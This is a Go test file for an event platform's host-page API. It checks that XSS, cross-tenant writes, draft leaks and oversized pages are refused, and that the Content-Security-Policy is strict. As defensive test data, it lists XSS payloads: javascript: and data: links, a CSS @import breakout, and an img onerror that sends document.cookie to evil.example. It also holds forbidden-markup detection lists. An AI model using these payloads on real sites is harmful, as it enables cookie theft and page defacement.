package httpapi

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/vul-os/cackle/internal/events"
	"github.com/vul-os/cackle/internal/pages"
	"github.com/vul-os/cackle/internal/store"
)

// Host page tests. The two that matter most, and which the brief calls out by
// name, are TestHostPage_XSSThroughHostContentIsRefused and
// TestHostPage_CrossTenantWriteIsRefused; the rest hold up the properties those
// two depend on.

func hostPageDoc(blocks ...map[string]any) map[string]any {
	return map[string]any{"version": pages.Version, "blocks": blocks}
}

// putPage submits a document as the given user and returns the recorder.
func (h *testHarness) putPage(eventRef, token string, doc any) *httptest.ResponseRecorder {
	return h.do(http.MethodPut, "/api/events/"+eventRef+"/page", token, doc)
}

// newDraftEvent creates an unpublished event in an existing org.
func (h *testHarness) newDraftEvent(t *testing.T, orgID, token, slug string) string {
	t.Helper()
	starts := time.Now().Add(60 * 24 * time.Hour)
	rec := h.do(http.MethodPost, "/api/events", token, struct {
		OrgID string `json:"org_id"`
		events.CreateEventInput
	}{
		OrgID: orgID,
		CreateEventInput: events.CreateEventInput{
			Slug: slug, Title: "Draft " + slug,
			VenueName: "Undisclosed", Address: "Undisclosed",
			StartsAt: starts, EndsAt: starts.Add(3 * time.Hour),
			Timezone: "UTC", Currency: "ZAR",
		},
	})
	if rec.Code != http.StatusCreated {
		t.Fatalf("create draft event: status %d body %s", rec.Code, rec.Body.String())
	}
	return decodeBody[struct {
		Event events.Event `json:"event"`
	}](t, rec).Event.ID
}

// TestHostPage_DefaultPageNeedsNoConfiguration is requirement (f): a brand new
// event has a real page immediately, and that page fetches nothing from
// anywhere else.
func TestHostPage_DefaultPageNeedsNoConfiguration(t *testing.T) {
	h := newTestHarness(t)
	h.newPublishedEvent(t, "page-default")

	rec := h.do(http.MethodGet, "/h/test-event-page-default", "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("host page: status %d body %s", rec.Code, rec.Body.String())
	}
	if ct := rec.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/html") {
		t.Errorf("content type = %q, want text/html", ct)
	}

	body := rec.Body.String()
	if !strings.Contains(body, "Test Event page-default") {
		t.Error("the default page does not show the event title")
	}
	if !strings.Contains(body, "General") || !strings.Contains(body, "150.00") {
		t.Error("the default page does not show the event's ticket types and prices")
	}
	// No script, and nothing that would make the browser reach another origin.
	for _, forbidden := range []string{"<script", "<iframe", "<object", "<embed", "<form", "@import", "http://", "https://"} {
		if strings.Contains(body, forbidden) {
			t.Errorf("the default page contains %q — it must be self-contained and script-free", forbidden)
		}
	}
}

// TestHostPage_XSSThroughHostContentIsRefused is the security test the brief
// asks for. It attacks the page from every direction the format exposes.
func TestHostPage_XSSThroughHostContentIsRefused(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "page-xss")

	// ── Part 1: the payloads that must be REFUSED at the door ──────────────
	//
	// Each of these is an attempt to get something other than text into the
	// page: a script URL, a CSS breakout, a raw HTML field, a scheme that
	// executes. All are 400s, and none of them reach storage.
	refused := []struct {
		name string
		doc  any
	}{
		{"javascript: link", hostPageDoc(map[string]any{
			"type": "links", "links": []any{map[string]any{"label": "Free tickets", "href": "javascript:alert(document.cookie)"}},
		})},
		{"data: link carrying markup", hostPageDoc(map[string]any{
			"type": "links", "links": []any{map[string]any{"label": "Info", "href": "data:text/html,<script>alert(1)</script>"}},
		})},
		{"javascript: on the ticket call to action", hostPageDoc(map[string]any{
			"type": "tickets", "cta_href": "javascript:fetch('/api/auth/me').then(r=>r.text())",
		})},
		{"CSS breakout through a theme colour", map[string]any{
			"version": pages.Version,
			"theme":   map[string]any{"background": "#fff;} body{} @import url('https://evil.example/x.css'); .a{"},
			"blocks":  []any{},
		}},
		{"a raw html field that does not exist", map[string]any{
			"version": pages.Version,
			"blocks":  []any{map[string]any{"type": "html", "text": "<script>alert(1)</script>"}},
		}},
		{"an unknown top-level field", map[string]any{
			"version": pages.Version, "blocks": []any{}, "custom_head": "<script>alert(1)</script>",
		}},
		{"a stowaway field on a block that ignores it", map[string]any{
			"version": pages.Version,
			"blocks":  []any{map[string]any{"type": "divider", "text": "<script>alert(1)</script>"}},
		}},
		{"a bidi override in a link label", hostPageDoc(map[string]any{
			"type": "links", "links": []any{map[string]any{"label": "moc.elpmaxe‮", "href": "https://evil.example/"}},
		})},
		{"credentials smuggled before the host", hostPageDoc(map[string]any{
			"type": "links", "links": []any{map[string]any{"label": "Official site", "href": "https://cackle.example.org@evil.example/"}},
		})},
	}
	for _, tc := range refused {
		t.Run("refused/"+tc.name, func(t *testing.T) {
			rec := h.putPage(fx.eventID, fx.ownerToken, tc.doc)
			if rec.Code != http.StatusBadRequest {
				t.Fatalf("expected 400, got %d body %s", rec.Code, rec.Body.String())
			}
			var env struct {
				Error struct{ Code, Message string } `json:"error"`
			}
			if err := json.Unmarshal(rec.Body.Bytes(), &env); err != nil {
				t.Fatalf("decode error envelope: %v", err)
			}
			if env.Error.Code != codeInvalidRequest {
				t.Errorf("error code = %q, want %q", env.Error.Code, codeInvalidRequest)
			}
			if env.Error.Message == "" {
				t.Error("a rejection must tell the host what was wrong")
			}
		})
	}

	// Nothing above was stored: the page is still the default.
	rec := h.do(http.MethodGet, "/api/events/"+fx.eventID+"/page", "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("get page: status %d body %s", rec.Code, rec.Body.String())
	}
	if !decodeBody[struct {
		Page struct {
			IsDefault bool `json:"is_default"`
		} `json:"page"`
	}](t, rec).Page.IsDefault {
		t.Fatal("a refused document was stored anyway")
	}

	// ── Part 2: the payloads that are ACCEPTED as text, and must render as
	// text. Refusing these would be wrong — a host whose act is called
	// "<script>" is entitled to say so — so the guarantee is that they come
	// out escaped.
	stored := hostPageDoc(
		map[string]any{"type": "heading", "text": `<script>alert(document.cookie)</script>`, "level": 2},
		map[string]any{"type": "text", "paragraphs": []any{
			`"><img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`,
			`</style><style>body{background:url('https://evil.example/beacon')}</style>`,
			`</title></head><body onload=alert(1)>`,
		}},
		map[string]any{"type": "faq", "items": []any{map[string]any{
			"question": `<svg/onload=alert(1)>`,
			"answer":   `'};alert(1);var x={'`,
		}}},
	)
	if rec := h.putPage(fx.eventID, fx.ownerToken, stored); rec.Code != http.StatusOK {
		t.Fatalf("store legal-but-hostile text: status %d body %s", rec.Code, rec.Body.String())
	}

	rec = h.do(http.MethodGet, "/h/test-event-page-xss", "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("host page: status %d body %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()

	for _, payload := range []string{
		`<script>alert(document.cookie)</script>`,
		`"><img src=x onerror=`,
		`</style><style>`,
		`</title></head><body onload=alert(1)>`,
		`<svg/onload=alert(1)>`,
	} {
		if strings.Contains(body, payload) {
			t.Errorf("host text reached the browser verbatim as markup: %q", payload)
		}
	}
	for _, forbidden := range []string{"<script", "<svg", "<iframe", "javascript:"} {
		if strings.Contains(body, forbidden) {
			t.Errorf("rendered page contains %q", forbidden)
		}
	}
	// "evil.example" and "url(" DO appear in this page — inside the escaped
	// run of text the host wrote, which is correct and harmless. What must
	// never happen is either of them landing in a context the BROWSER acts
	// on. Two checks, one per context that exists here.
	//
	// (a) No URL-bearing attribute at all: this document has no link block
	//     and no image block, so any src=/href= means text escaped its
	//     context.
	for _, forbidden := range []string{`src="`, `href="`} {
		if strings.Contains(body, forbidden) {
			t.Errorf("rendered page contains %q — host text reached a URL context", forbidden)
		}
	}
	// (b) Nothing of the host's reached the stylesheet. The page's own CSS
	//     contains no url() and no @import, so finding either inside the
	//     <style> element means a CSS context was breached.
	styleBlock := betweenTags(t, body, "<style", "</style>")
	for _, forbidden := range []string{"url(", "@import", "evil.example", "expression(", "</style"} {
		if strings.Contains(styleBlock, forbidden) {
			t.Errorf("the stylesheet contains %q — host text reached a CSS context", forbidden)
		}
	}
	if !strings.Contains(body, "evil.example") {
		t.Error("the host's text was dropped rather than escaped")
	}
	// Present, escaped — not silently dropped.
	if !strings.Contains(body, "&lt;script&gt;alert(document.cookie)&lt;/script&gt;") {
		t.Error("the host's text was dropped rather than escaped")
	}

	// ── Part 3: the response's own policy. Even if everything above failed,
	// the browser is instructed to run nothing and post nowhere.
	csp := rec.Header().Get("Content-Security-Policy")
	for _, want := range []string{
		"default-src 'none'", "script-src 'none'", "form-action 'none'",
		"base-uri 'none'", "frame-ancestors 'none'", "connect-src 'none'",
		"font-src 'none'", "img-src 'self'", "sandbox ",
	} {
		if !strings.Contains(csp, want) {
			t.Errorf("host page CSP is missing %q; got %q", want, csp)
		}
	}
	if strings.Contains(csp, "'unsafe-inline'") || strings.Contains(csp, "'unsafe-eval'") {
		t.Errorf("host page CSP must not contain an unsafe- keyword; got %q", csp)
	}
	if strings.Contains(csp, "allow-scripts") || strings.Contains(csp, "allow-same-origin") || strings.Contains(csp, "allow-forms") {
		t.Errorf("host page sandbox must not grant scripts, same-origin or forms; got %q", csp)
	}
	// The nonce in the header must be the nonce on the one <style> element,
	// and must not be a fixed string.
	nonce := cspNonceOf(t, csp)
	if !strings.Contains(body, `<style nonce="`+nonce+`">`) {
		t.Error("the stylesheet nonce does not match the one in the CSP header")
	}
	if strings.Count(body, "<style") != 1 {
		t.Errorf("expected exactly one <style> element, found %d", strings.Count(body, "<style"))
	}

	// A second request must get a different nonce, or it is not a nonce.
	rec2 := h.do(http.MethodGet, "/h/test-event-page-xss", "", nil)
	if n2 := cspNonceOf(t, rec2.Header().Get("Content-Security-Policy")); n2 == nonce {
		t.Error("the CSP nonce is reused across responses")
	}
}

func cspNonceOf(t *testing.T, csp string) string {
	t.Helper()
	const marker = "style-src 'nonce-"
	i := strings.Index(csp, marker)
	if i < 0 {
		t.Fatalf("no style-src nonce in CSP %q", csp)
	}
	rest := csp[i+len(marker):]
	j := strings.Index(rest, "'")
	if j <= 0 {
		t.Fatalf("malformed nonce in CSP %q", csp)
	}
	return rest[:j]
}

// TestHostPage_CrossTenantWriteIsRefused is the tenancy test the brief asks
// for: an admin of one org must not be able to write another org's page.
func TestHostPage_CrossTenantWriteIsRefused(t *testing.T) {
	h := newTestHarness(t)
	victim := h.newPublishedEvent(t, "page-victim")
	attacker := h.newPublishedEvent(t, "page-attacker")

	// The victim publishes a page of their own first, so we can prove it is
	// still intact afterwards.
	good := hostPageDoc(map[string]any{"type": "heading", "text": "The real line-up", "level": 2})
	if rec := h.putPage(victim.eventID, victim.ownerToken, good); rec.Code != http.StatusOK {
		t.Fatalf("victim stores their own page: status %d body %s", rec.Code, rec.Body.String())
	}

	defaced := hostPageDoc(map[string]any{"type": "heading", "text": "CANCELLED — refunds at evil.example", "level": 2})

	// By event id, by slug, and with a DELETE for good measure: three ways to
	// name someone else's page, all refused.
	for _, tc := range []struct {
		name, method, ref string
		body              any
	}{
		{"put by event id", http.MethodPut, victim.eventID, defaced},
		{"put by slug", http.MethodPut, "test-event-page-victim", defaced},
		{"delete by event id", http.MethodDelete, victim.eventID, nil},
	} {
		t.Run(tc.name, func(t *testing.T) {
			rec := h.do(tc.method, "/api/events/"+tc.ref+"/page", attacker.ownerToken, tc.body)
			if rec.Code != http.StatusForbidden {
				t.Fatalf("expected 403, got %d body %s", rec.Code, rec.Body.String())
			}
		})
	}

	// An anonymous caller cannot write it either.
	if rec := h.putPage(victim.eventID, "", defaced); rec.Code != http.StatusUnauthorized {
		t.Fatalf("anonymous write: expected 401, got %d body %s", rec.Code, rec.Body.String())
	}

	// The victim's page is untouched.
	rec := h.do(http.MethodGet, "/h/test-event-page-victim", "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("victim page: status %d", rec.Code)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "The real line-up") {
		t.Error("the victim's own content is gone")
	}
	if strings.Contains(body, "evil.example") || strings.Contains(body, "CANCELLED") {
		t.Error("an attacker's content reached the victim's page")
	}
}

// TestHostPage_CrossTenantImageReferenceIsRefused closes the subtler tenancy
// hole: RBAC on the page route alone would still let an admin of org B embed
// org A's images on their OWN page, republishing another host's content.
func TestHostPage_CrossTenantImageReferenceIsRefused(t *testing.T) {
	h := newTestHarness(t)
	victim := h.newPublishedEvent(t, "page-img-victim")
	attacker := h.newPublishedEvent(t, "page-img-attacker")

	rec := h.doMultipartFile(http.MethodPost, "/api/events/"+victim.eventID+"/images", victim.ownerToken, "poster.png", makeTestPNGBytes(t, 10, 10))
	if rec.Code != http.StatusCreated {
		t.Fatalf("victim uploads an image: status %d body %s", rec.Code, rec.Body.String())
	}
	victimImageID := decodeBody[struct {
		ID string `json:"id"`
	}](t, rec).ID

	doc := hostPageDoc(map[string]any{"type": "image", "image_id": victimImageID, "alt": "not mine"})
	rec = h.putPage(attacker.eventID, attacker.ownerToken, doc)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for a foreign image id, got %d body %s", rec.Code, rec.Body.String())
	}

	// And the attacker's page never renders it.
	rec = h.do(http.MethodGet, "/h/test-event-page-img-attacker", "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("attacker page: status %d", rec.Code)
	}
	if strings.Contains(rec.Body.String(), victimImageID) {
		t.Error("another event's image id reached the rendered page")
	}

	// The victim referencing their OWN image is fine — the check is
	// ownership, not a blanket ban.
	doc = hostPageDoc(map[string]any{"type": "image", "image_id": victimImageID, "alt": "the poster"})
	if rec := h.putPage(victim.eventID, victim.ownerToken, doc); rec.Code != http.StatusOK {
		t.Fatalf("victim references their own image: status %d body %s", rec.Code, rec.Body.String())
	}
	rec = h.do(http.MethodGet, "/h/test-event-page-img-victim", "", nil)
	if !strings.Contains(rec.Body.String(), "/media/"+victimImageID) {
		t.Error("the event's own image was not rendered on its own page")
	}
}

// TestHostPage_PageForOneEventLeaksNothingAboutAnother is the other half of
// requirement (c).
func TestHostPage_PageForOneEventLeaksNothingAboutAnother(t *testing.T) {
	h := newTestHarness(t)
	a := h.newPublishedEvent(t, "page-leak-a")
	b := h.newPublishedEvent(t, "page-leak-b")

	secret := "SECRET-LINEUP-OF-EVENT-B"
	if rec := h.putPage(b.eventID, b.ownerToken, hostPageDoc(
		map[string]any{"type": "heading", "text": secret, "level": 2},
	)); rec.Code != http.StatusOK {
		t.Fatalf("store B's page: status %d body %s", rec.Code, rec.Body.String())
	}

	rec := h.do(http.MethodGet, "/h/test-event-page-leak-a", "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("A's page: status %d", rec.Code)
	}
	body := rec.Body.String()
	for _, leaked := range []string{secret, b.eventID, b.orgID, b.ticketTypeID, "test-event-page-leak-b"} {
		if strings.Contains(body, leaked) {
			t.Errorf("event A's public page leaks %q from event B", leaked)
		}
	}
	// A's page must not name A's org either — an org id is not public data.
	if strings.Contains(body, a.orgID) {
		t.Error("the public page exposes the owning org id")
	}
}

// TestHostPage_DraftEventHasNoPublicPage: an unpublished event's page, and
// therefore its title, venue and line-up, is not served to anyone.
func TestHostPage_DraftEventHasNoPublicPage(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "page-draft")
	draftID := h.newDraftEvent(t, fx.orgID, fx.ownerToken, "page-draft-secret")

	// The organiser CAN build the page before publishing.
	doc := hostPageDoc(map[string]any{"type": "heading", "text": "Unannounced headliner", "level": 2})
	if rec := h.putPage(draftID, fx.ownerToken, doc); rec.Code != http.StatusOK {
		t.Fatalf("organiser writes a draft's page: status %d body %s", rec.Code, rec.Body.String())
	}

	// An anonymous visitor gets 404 — not 403, which would confirm the draft
	// exists — and the body leaks nothing.
	for _, path := range []string{"/h/page-draft-secret", "/h/" + draftID} {
		rec := h.do(http.MethodGet, path, "", nil)
		if rec.Code != http.StatusNotFound {
			t.Errorf("%s: expected 404 for a draft, got %d", path, rec.Code)
		}
		if strings.Contains(rec.Body.String(), "Unannounced headliner") || strings.Contains(rec.Body.String(), "Draft page-draft-secret") {
			t.Errorf("%s: the 404 body leaks the draft's content", path)
		}
	}
	if rec := h.do(http.MethodGet, "/api/events/"+draftID+"/page", "", nil); rec.Code != http.StatusNotFound {
		t.Errorf("anonymous JSON read of a draft's page: expected 404, got %d", rec.Code)
	}

	// So does an admin of a DIFFERENT org — the draft is not theirs.
	other := h.newPublishedEvent(t, "page-draft-outsider")
	if rec := h.do(http.MethodGet, "/h/page-draft-secret", other.ownerToken, nil); rec.Code != http.StatusNotFound {
		t.Errorf("another org's admin reading a draft preview: expected 404, got %d", rec.Code)
	}

	// The event's OWN organiser can preview it, which is what makes building a
	// page before publishing possible at all.
	rec := h.do(http.MethodGet, "/h/page-draft-secret", fx.ownerToken, nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("organiser preview: status %d body %s", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "Unannounced headliner") {
		t.Error("the organiser's preview did not render their own draft page")
	}
	if cc := rec.Header().Get("Cache-Control"); cc != "private, no-store" {
		t.Errorf("a draft preview must not be cacheable; Cache-Control = %q", cc)
	}
	if rec := h.do(http.MethodGet, "/api/events/"+draftID+"/page", fx.ownerToken, nil); rec.Code != http.StatusOK {
		t.Errorf("organiser JSON read of their own draft's page: expected 200, got %d body %s", rec.Code, rec.Body.String())
	}

	// Publishing makes it visible, which is the point.
	if rec := h.do(http.MethodPost, "/api/events/"+draftID+"/publish", fx.ownerToken, nil); rec.Code != http.StatusOK {
		t.Fatalf("publish: status %d body %s", rec.Code, rec.Body.String())
	}
	rec = h.do(http.MethodGet, "/h/page-draft-secret", "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("published page: status %d", rec.Code)
	}
	if !strings.Contains(rec.Body.String(), "Unannounced headliner") {
		t.Error("the page stored while the event was a draft did not appear on publication")
	}
}

// TestHostPage_ScannerCannotWriteThePage checks the RBAC ladder: read-only org
// members are not page editors.
func TestHostPage_ScannerCannotWriteThePage(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "page-rbac")

	scannerToken, scannerID := h.signupUser("scanner-page-rbac@example.com", "scanner-password-123", "Scanner")
	if err := h.store.AddOrgMember(t.Context(), &store.OrgMember{OrgID: fx.orgID, UserID: scannerID, Role: "scanner"}); err != nil {
		t.Fatalf("add scanner: %v", err)
	}

	doc := hostPageDoc(map[string]any{"type": "heading", "text": "Scanner was here", "level": 2})
	if rec := h.putPage(fx.eventID, scannerToken, doc); rec.Code != http.StatusForbidden {
		t.Fatalf("scanner write: expected 403, got %d body %s", rec.Code, rec.Body.String())
	}
	if rec := h.do(http.MethodDelete, "/api/events/"+fx.eventID+"/page", scannerToken, nil); rec.Code != http.StatusForbidden {
		t.Fatalf("scanner delete: expected 403, got %d", rec.Code)
	}
}

// TestHostPage_DeleteRevertsToTheDefault: removing a page never leaves an
// event without one.
func TestHostPage_DeleteRevertsToTheDefault(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "page-delete")

	doc := hostPageDoc(map[string]any{"type": "heading", "text": "Custom heading", "level": 2})
	if rec := h.putPage(fx.eventID, fx.ownerToken, doc); rec.Code != http.StatusOK {
		t.Fatalf("store: status %d body %s", rec.Code, rec.Body.String())
	}
	if rec := h.do(http.MethodGet, "/h/test-event-page-delete", "", nil); !strings.Contains(rec.Body.String(), "Custom heading") {
		t.Fatal("the stored page did not render")
	}

	if rec := h.do(http.MethodDelete, "/api/events/"+fx.eventID+"/page", fx.ownerToken, nil); rec.Code != http.StatusNoContent {
		t.Fatalf("delete: status %d body %s", rec.Code, rec.Body.String())
	}

	rec := h.do(http.MethodGet, "/h/test-event-page-delete", "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("after delete: status %d", rec.Code)
	}
	body := rec.Body.String()
	if strings.Contains(body, "Custom heading") {
		t.Error("the deleted page is still being served")
	}
	if !strings.Contains(body, "Test Event page-delete") {
		t.Error("deleting the page left the event without one")
	}

	// Deleting a page that does not exist is not an error.
	if rec := h.do(http.MethodDelete, "/api/events/"+fx.eventID+"/page", fx.ownerToken, nil); rec.Code != http.StatusNoContent {
		t.Fatalf("second delete: status %d", rec.Code)
	}
}

// TestHostPage_OversizedDocumentIsRefused: the body is bounded before it is
// buffered, so a host cannot spend the server's memory writing their own page.
func TestHostPage_OversizedDocumentIsRefused(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "page-huge")

	huge := strings.Repeat("x", pages.MaxDocumentBytes+1024)
	doc := hostPageDoc(map[string]any{"type": "text", "paragraphs": []any{huge}})
	rec := h.putPage(fx.eventID, fx.ownerToken, doc)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400 for an oversized document, got %d body %s", rec.Code, rec.Body.String())
	}
	if strings.Contains(rec.Body.String(), huge[:64]) {
		t.Error("the error response echoes the submitted body back")
	}
}

// TestHostPage_APIRoundTrip is the contract docs/HOST-PAGES.md documents: what
// you PUT is what you GET, and what you GET is what renders.
func TestHostPage_APIRoundTrip(t *testing.T) {
	h := newTestHarness(t)
	fx := h.newPublishedEvent(t, "page-roundtrip")

	rec := h.do(http.MethodGet, "/api/events/test-event-page-roundtrip/page", "", nil)
	if rec.Code != http.StatusOK {
		t.Fatalf("get default page: status %d body %s", rec.Code, rec.Body.String())
	}
	first := decodeBody[struct {
		Page struct {
			Document  json.RawMessage `json:"document"`
			IsDefault bool            `json:"is_default"`
			URL       string          `json:"url"`
			UpdatedAt *time.Time      `json:"updated_at"`
		} `json:"page"`
	}](t, rec)
	if !first.Page.IsDefault {
		t.Error("an event with no stored page should report is_default")
	}
	if first.Page.URL != "/h/test-event-page-roundtrip" {
		t.Errorf("url = %q", first.Page.URL)
	}
	if first.Page.UpdatedAt != nil {
		t.Error("a default page has no update time")
	}
	// The default is itself a submittable document.
	if _, err := pages.Parse(first.Page.Document); err != nil {
		t.Errorf("the default document is not a valid document: %v", err)
	}

	doc := map[string]any{
		"version": pages.Version,
		"lang":    "pt-BR",
		"theme":   map[string]any{"background": "#101014", "accent": "#F2C14E", "direction": "ltr", "font": "serif"},
		"labels":  map[string]any{"tickets": "Ingressos", "free": "Gratuito"},
		"blocks": []any{
			map[string]any{"type": "heading", "text": "Sobre", "level": 2},
			map[string]any{"type": "text", "paragraphs": []any{"Uma noite só."}},
			map[string]any{"type": "tickets"},
		},
	}
	rec = h.putPage(fx.eventID, fx.ownerToken, doc)
	if rec.Code != http.StatusOK {
		t.Fatalf("put: status %d body %s", rec.Code, rec.Body.String())
	}

	rec = h.do(http.MethodGet, "/api/events/"+fx.eventID+"/page", "", nil)
	stored := decodeBody[struct {
		Page struct {
			Document  json.RawMessage `json:"document"`
			IsDefault bool            `json:"is_default"`
			UpdatedAt *time.Time      `json:"updated_at"`
		} `json:"page"`
	}](t, rec)
	if stored.Page.IsDefault {
		t.Error("a stored page should not report is_default")
	}
	if stored.Page.UpdatedAt == nil {
		t.Error("a stored page should carry an update time")
	}
	got, err := pages.Parse(stored.Page.Document)
	if err != nil {
		t.Fatalf("the document we just stored no longer parses: %v", err)
	}
	if got.Lang != "pt-BR" || got.Theme.Accent != "#F2C14E" || got.Labels.Tickets != "Ingressos" || len(got.Blocks) != 3 {
		t.Errorf("round trip changed the document: %+v", got)
	}

	body := h.do(http.MethodGet, "/h/test-event-page-roundtrip", "", nil).Body.String()
	for _, want := range []string{`lang="pt-BR"`, "--hp-bg: #101014;", "Ingressos", "Sobre", "Uma noite só."} {
		if !strings.Contains(body, want) {
			t.Errorf("rendered page is missing %q", want)
		}
	}
	if strings.Contains(body, "ZgotmplZ") {
		t.Error("a legitimate value was neutralised by the escaper")
	}
}

// TestHostPage_UnknownEventIsAFriendly404 — the route is reached by a browser,
// so a JSON error envelope is not an answer.
func TestHostPage_UnknownEventIsAFriendly404(t *testing.T) {
	h := newTestHarness(t)
	rec := h.do(http.MethodGet, "/h/no-such-event", "", nil)
	if rec.Code != http.StatusNotFound {
		t.Fatalf("status %d", rec.Code)
	}
	if ct := rec.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/html") {
		t.Errorf("content type = %q, want text/html", ct)
	}
	if csp := rec.Header().Get("Content-Security-Policy"); !strings.Contains(csp, "script-src 'none'") {
		t.Errorf("the 404 page must carry the same locked-down policy; got %q", csp)
	}
	if strings.Contains(rec.Body.String(), `"error"`) {
		t.Error("the host page 404 should be a page, not the API error envelope")
	}
}

// betweenTags returns the text between the first occurrence of open and the
// first occurrence of close after it.
func betweenTags(t *testing.T, body, open, close string) string {
	t.Helper()
	i := strings.Index(body, open)
	if i < 0 {
		t.Fatalf("no %q in the rendered page", open)
	}
	rest := body[i:]
	j := strings.Index(rest, close)
	if j < 0 {
		t.Fatalf("no %q after %q in the rendered page", close, open)
	}
	return rest[:j]
}
